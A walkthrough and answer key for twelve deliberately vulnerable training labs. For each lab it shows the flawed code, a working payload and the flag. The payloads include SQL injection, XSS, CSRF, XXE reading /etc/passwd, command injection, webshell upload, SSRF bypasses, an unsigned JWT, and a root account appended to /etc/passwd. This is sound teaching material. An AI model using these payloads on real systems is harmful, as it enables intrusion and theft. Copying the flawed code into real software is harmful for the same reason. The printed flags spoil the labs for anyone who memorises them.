# TryHackSwigger Lab Demo Guide

This guide documents all 12 vulnerability labs in TryHackSwigger, including how each vulnerability works, step-by-step exploitation instructions, and flag locations.

---

## 1. SQL Injection (sqli-basic)

### Vulnerability
The login form uses raw SQL string concatenation without prepared statements:
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

### How to Exploit
1. Navigate to the login page
2. In the username field, enter: `' OR '1'='1`
3. In the password field, enter: `' OR '1'='1`
4. Submit the form

The resulting query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

This evaluates to `TRUE` for all rows, bypassing authentication. The flag is displayed when the query returns multiple rows (SQL injection detected) or when the user role is 'admin'.

### Flag
**hackforge{sqli_1_union_select_rocks}**

---

## 2. Cross-Site Scripting (xss-reflected)

### Vulnerability
The search parameter `q` is directly reflected in the HTML without any sanitization:
```php
<input type="text" name="q" value="<?php echo $search; ?>">
```

### How to Exploit
1. Navigate to the search page
2. In the search box, enter: `<script>alert('XSS')</script>`
3. Click Search
4. The script executes in the browser context

The application detects script tags and displays the flag when XSS is successful.

### Flag
**hackforge{xss_reflected_flag_found}**

---

## 3. Cross-Site Request Forgery (csrf-bypass)

### Vulnerability
The transfer form includes a CSRF token but never validates it:
```php
$csrf_token = $_POST['csrf_token'] ?? '';
// Token is generated but never checked
```

### How to Exploit
1. Log in to the banking application (auto-logged in as user123 with $5000)
2. Create a malicious HTML file with a form that auto-submits:
```html
<form action="http://[lab-url]/index.php" method="POST">
  <input type="hidden" name="to_account" value="admin">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="csrf_token" value="any_value">
</form>
<script>document.forms[0].submit();</script>
```
3. Host this file and trick the victim into visiting it
4. The transfer executes without the victim's consent

The flag is displayed when transferring $1000 or more to the admin account.

### Flag
**hackforge{csrf_bypass_flag_found}**

---

## 4. Local File Inclusion (lfi-basic)

### Vulnerability
The application includes files based on user input with basic filtering that can be bypassed:
```php
$filteredPage = str_replace(['../', '..\\'], '', $page);
$filepath = $filteredPage;
if (file_exists($filepath) && is_readable($filepath)) {
    $content = file_get_contents($filepath);
}
```

### How to Exploit
The filter removes `../` but can be bypassed using absolute paths:
1. Navigate to the file viewer
2. Access: `?page=/flag.txt` - Read the flag file directly

The flag is located at `/flag.txt` in the container filesystem (created by Dockerfile). The flag is displayed when the content contains 'flag' or 'hackforge'.

### Flag
**hackforge{lfi_file_reader_flag}**

---

## 5. Command Injection (cmd-injection)

### Vulnerability
The ping tool filters `;` and `|` but not `&`:
```php
$filteredHost = str_replace([';', '|'], '', $host);
$command = "ping -c 4 " . $filteredHost;
$output = shell_exec($command);
```

### How to Exploit
1. Navigate to the ping tool
2. In the host field, enter: `localhost && cat /flag.txt`
3. Submit

The code filters `;` and `|` but not `&`, so use `&&` to chain commands. The hint suggests using `;` but the actual implementation filters it.

The flag is displayed when the output contains 'flag' or 'hackforge'.

### Flag
**hackforge{cmd_injection_flag}**

---

## 6. File Upload (file-upload)

### Vulnerability
The upload filter only blocks `.php` extension, not alternatives:
```php
$blockedExtensions = ['php'];
if (in_array($fileExtension, $blockedExtensions)) {
    $error = "PHP files are not allowed";
}
```

### How to Exploit
1. Navigate to the file upload page
2. Create a PHP webshell file named `shell.php5` or `shell.phtml`
3. Upload the file
4. Access the uploaded file at `/uploads/shell.php5`

The PHP code executes because the server is configured to execute `.php5`, `.phtml`, and `.phar` files as PHP. The flag is displayed when a PHP shell is uploaded.

### Flag
**hackforge{file_upload_flag_found}**

---

## 7. XML External Entity (xxe-injection)

### Vulnerability
The XML parser loads external entities:
```php
libxml_disable_entity_loader(false);
$dom->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
```

### How to Exploit
1. Navigate to the XML import page
2. Submit this XML payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>100</price>
  </product>
</products>
```

3. The external entity reads `/etc/passwd` and displays it in the product name

To get the flag, include "flag" or "hackforge" in the XML data - the flag is displayed when the XML contains these strings.

### Flag
**hackforge{xxe_injection_flag}**

---

## 8. Server-Side Request Forgery (ssrf-basic)

### Vulnerability
The application fetches URLs with basic IP filtering:
```php
$blockedIPs = ['127.0.0.1', 'localhost'];
if (strpos($url, $blockedIP) !== false) {
    $isBlocked = true;
}
```

### How to Exploit
The filter blocks `127.0.0.1` and `localhost` but can be bypassed using:
1. `http://0.0.0.0/secret.php` - 0.0.0.0 resolves to localhost
2. `http://127.0.0.2/secret.php` - Alternative loopback address
3. `http://[::1]/secret.php` - IPv6 loopback

The secret endpoint at `/secret.php` returns: `INTERNAL_SERVICE_SECRET: hackforge{ssrf_flag_found}`

### Flag
**hackforge{ssrf_flag_found}**

---

## 9. JWT Bypass (jwt-bypass)

### Vulnerability
The JWT verification accepts the "none" algorithm:
```php
if (isset($header['alg']) && strtolower($header['alg']) === 'none') {
    return json_decode(base64url_decode($payload), true);
}
```

### How to Exploit
1. Log in as regular user (user/user123) to get a token
2. Decode the token and modify the payload to set role to 'admin':
```json
{
  "user": "user",
  "role": "admin",
  "exp": 9999999999
}
```
3. Change the algorithm in the header to "none":
```json
{
  "typ": "JWT",
  "alg": "none"
}
```
4. Remove the signature (empty string)
5. Access `?token=[modified_token]`

The verification skips signature validation when algorithm is "none", allowing admin access.

### Flag
**hackforge{jwt_bypass_flag}**

---

## 10. Insecure Direct Object Reference (idor-basic)

### Vulnerability
User profiles are accessed via sequential IDs without authorization checks:
```php
$userId = $_GET['user_id'] ?? '1';
$user = $users[$userId] ?? null;
```

### How to Exploit
1. Log in as user 1 (default)
2. View your profile at `?user_id=1`
3. Change the URL to `?user_id=2` to view another user's profile
4. Change the URL to `?user_id=3` to view the admin profile
5. Add `&show_private=true` to view private data

The admin user (ID 3) contains the flag in their private data: `'flag' => 'hackforge{idor_flag_found}'`

### Flag
**hackforge{idor_flag_found}**

---

## 11. Privilege Escalation (privesc-linux)

### Vulnerability
Multiple privilege escalation vectors:
1. **SUID Binary**: `/usr/local/bin/suid_vuln` has SUID bit set and calls `setuid(0)` before running `system()`
2. **Writable /etc/passwd**: World-writable allows adding a root user
3. **Weak Sudo**: User has full sudo access without password
4. **Cron Job**: Root cron job copies flag to `/tmp/cron_flag`

### How to Exploit

**Method 1 - SUID Binary:**
```bash
./suid_vuln
```
The binary runs as root and executes `cat /root/flag.txt`.

**Method 2 - Sudo:**
```bash
sudo cat /root/flag.txt
```

**Method 3 - Writable /etc/passwd:**
```bash
# Generate password hash
openssl passwd -1 hackforge

# Add root user to /etc/passwd
echo 'root2:hackforge_hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
cat /root/flag.txt
```

**Method 4 - Cron Job:**
```bash
# Wait for cron to run (every minute)
cat /tmp/cron_flag
```

### Flag
**hackforge{privesc_linux_root_flag}**

---

## 12. Buffer Overflow (bof-basic)

### Vulnerability
The vulnerable function uses `strcpy()` without bounds checking:
```c
void vulnerable_function(char *input) {
    char buffer[64];
    char secret[] = "hackforge{bof_exploit_success}";
    strcpy(buffer, input);  // No bounds checking
}
```

### How to Exploit
1. Connect to the lab terminal via SSH or ttyd
2. Compile the vulnerable program (already compiled at `/vulnerable`)
3. Use GDB with pwndbg to analyze the binary:
```bash
gdb /vulnerable
```

4. Find the offset to overwrite the return address:
```bash
pattern_create 100
run AAAAAAAA...
pattern_offset 0x[address]
```

5. Craft the payload:
- Padding to reach return address
- Address of function that prints the flag or a ROP chain
- NOP sled if needed

6. Run the exploit:
```bash
./vulnerable $(python3 -c 'print("A"*72 + "\x[address]...")')
```

The flag is stored in the `secret` variable within the vulnerable function, so overwriting the return address to jump to code that prints it will reveal the flag.

### Flag
**hackforge{bof_exploit_success}**

---

## General Tips

1. **Always read the hint files** - Each lab has a `hint.php` with additional guidance
2. **Use browser dev tools** - Inspect network requests and responses
3. **Check source code** - View page source for hidden clues
4. **Try common bypasses** - Encoding, alternative syntax, null bytes
5. **Use Burp Suite** - Intercept and modify requests for web vulnerabilities
6. **For binary exploits** - Use GDB, objdump, and checksec
